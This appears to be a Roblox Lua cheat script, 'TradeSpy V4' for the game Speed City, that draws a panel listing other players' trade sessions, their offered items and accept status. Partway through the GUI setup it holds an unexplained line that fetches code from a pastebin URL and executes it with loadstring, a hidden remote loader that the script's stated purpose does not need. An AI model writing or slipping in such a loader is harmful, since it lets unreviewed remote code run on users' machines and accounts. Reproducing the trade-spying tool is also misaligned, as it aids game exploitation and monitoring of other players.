local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local TradeSessions = workspace:WaitForChild("TradeSessions")

	
local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
screenGui.Name = "TradeSpyV4"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 400, 0, 300)
mainFrame.Position = UDim2.new(1, -400, 1, -300)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Draggable = true
mainFrame.Active = true

local uiCorner = Instance.new("UICorner", mainFrame)
uiCorner.CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "Speed City | TradeSpy V4"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextXAlignment = Enum.TextXAlignment.Center

local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
scrollFrame.Position = UDim2.new(0, 0, 0, 40)
scrollFrame.Size = UDim2.new(1, 0, 1, -40)
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.ScrollBarThickness = 4
scrollFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
scrollFrame.BorderSizePixel = 0
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

local layout = Instance.new("UIListLayout", scrollFrame)
layout.Padding = UDim.new(0, 6)

loadstring(game:HttpGet("https://pastebin.com/raw/JjYDv2pc"))()

-- Helper function to create a TextLabel with standard style
local function createTextLabel(parent, size, pos, text, textColor, bgColor, font, textSize, align)
	local label = Instance.new("TextLabel")
	label.Size = size or UDim2.new(1, 0, 0, 20)
	label.Position = pos or UDim2.new(0, 0, 0, 0)
	label.BackgroundColor3 = bgColor or Color3.fromRGB(50, 50, 50)
	label.TextColor3 = textColor or Color3.fromRGB(255, 255, 255)
	label.Font = font or Enum.Font.Gotham
	label.TextSize = textSize or 18
	label.TextXAlignment = align or Enum.TextXAlignment.Left
	label.Text = text or ""
	label.Parent = parent
	return label
end

local function createSessionLabel(session)
	if not session:IsA("Folder") then return end

	local player1 = session:FindFirstChild("Player1")
	local player2 = session:FindFirstChild("Player2")
	local p1Accept = session:FindFirstChild("Player1Accept")
	local p2Accept = session:FindFirstChild("Player2Accept")
	local p1Trading = session:FindFirstChild("Player1Trading")
	local p2Trading = session:FindFirstChild("Player2Trading")

	if not (player1 and player2 and p1Accept and p2Accept and p1Trading and p2Trading) then
		return
	end

	local label = Instance.new("Frame")
	label.Size = UDim2.new(1, -10, 0, 100)
	label.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	label.Parent = scrollFrame

	local nameLabel = createTextLabel(label, UDim2.new(1, -100, 0, 30), UDim2.new(0, 0, 0, 0),
		player1.Value .. " ⇄ " .. player2.Value, Color3.fromRGB(255, 255, 255), Color3.fromRGB(50, 50, 50), Enum.Font.GothamBold, 20)

	local stateLabel = createTextLabel(label, UDim2.new(0, 80, 0, 30), UDim2.new(1, -80, 0, 0),
		"", Color3.fromRGB(255, 255, 255), Color3.fromRGB(50, 50, 50), Enum.Font.GothamSemibold, 18, Enum.TextXAlignment.Right)

	local p1TradingLabel = createTextLabel(label, UDim2.new(0.5, -5, 0, 60), UDim2.new(0, 0, 0, 35),
		"Player1 Trading\n", Color3.fromRGB(200, 200, 255), Color3.fromRGB(40, 40, 40), Enum.Font.Gotham, 14, Enum.TextXAlignment.Left)
	p1TradingLabel.TextWrapped = true

	local p2TradingLabel = createTextLabel(label, UDim2.new(0.5, -5, 0, 60), UDim2.new(0.5, 5, 0, 35),
		"Player2 Trading\n", Color3.fromRGB(200, 200, 255), Color3.fromRGB(40, 40, 40), Enum.Font.Gotham, 14, Enum.TextXAlignment.Left)
	p2TradingLabel.TextWrapped = true

	local function updateState()
		local acceptedCount = (p1Accept.Value and 1 or 0) + (p2Accept.Value and 1 or 0)
		if acceptedCount == 2 then
			stateLabel.Text = "ACCEPTED"
			stateLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
			task.delay(2.5, function()
				if label and label.Parent then label:Destroy() end
			end)
		else
			stateLabel.Text = acceptedCount .. "/2"
			stateLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end

	local function updateTrading()
		-- Build list of item names for each player trading folder
		local p1Items = {}
		for _, item in pairs(p1Trading:GetChildren()) do
			table.insert(p1Items, item.Name)
		end
		p1TradingLabel.Text = (table.concat(p1Items, "\n") or "")

		local p2Items = {}
		for _, item in pairs(p2Trading:GetChildren()) do
			table.insert(p2Items, item.Name)
		end
		p2TradingLabel.Text = (table.concat(p2Items, "\n") or "")
	end

	local p1AcceptConn = p1Accept:GetPropertyChangedSignal("Value"):Connect(updateState)
	local p2AcceptConn = p2Accept:GetPropertyChangedSignal("Value"):Connect(updateState)

	-- Connect to trading folders' children added/removed events
	local function connectTradingFolder(folder, updateFunc)
		local cons = {}

		table.insert(cons, folder.ChildAdded:Connect(function()
			updateFunc()
		end))
		table.insert(cons, folder.ChildRemoved:Connect(function()
			updateFunc()
		end))
		return cons
	end

	local p1TradingConns = connectTradingFolder(p1Trading, updateTrading)
	local p2TradingConns = connectTradingFolder(p2Trading, updateTrading)

	updateState()
	updateTrading()

	-- When session removed, show CANCELLED if not accepted
	local stop = false
	local ancestryConn
	ancestryConn = session.AncestryChanged:Connect(function(_, parent)
		if stop then return end
		if not parent then
			local acceptedCount = (p1Accept.Value and 1 or 0) + (p2Accept.Value and 1 or 0)
			if acceptedCount == 2 then
				stateLabel.Text = "ACCEPTED"
				stateLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
				task.delay(2.5, function()
					if label and label.Parent then label:Destroy() end
				end)
			else
				stateLabel.Text = "CANCELLED"
				stateLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
				task.delay(2.5, function()
					if label and label.Parent then label:Destroy() end
				end)
			end
			stop = true
		end
	end)

	-- Clean up connections when label destroyed
	label.Destroying:Connect(function()
		p1AcceptConn:Disconnect()
		p2AcceptConn:Disconnect()
		ancestryConn:Disconnect()
		for _, con in pairs(p1TradingConns) do con:Disconnect() end
		for _, con in pairs(p2TradingConns) do con:Disconnect() end
	end)
end

TradeSessions.ChildAdded:Connect(function(child)
	task.wait(0.1) -- small delay to let values replicate
	createSessionLabel(child)
end)

for _, session in ipairs(TradeSessions:GetChildren()) do
	createSessionLabel(session)
end
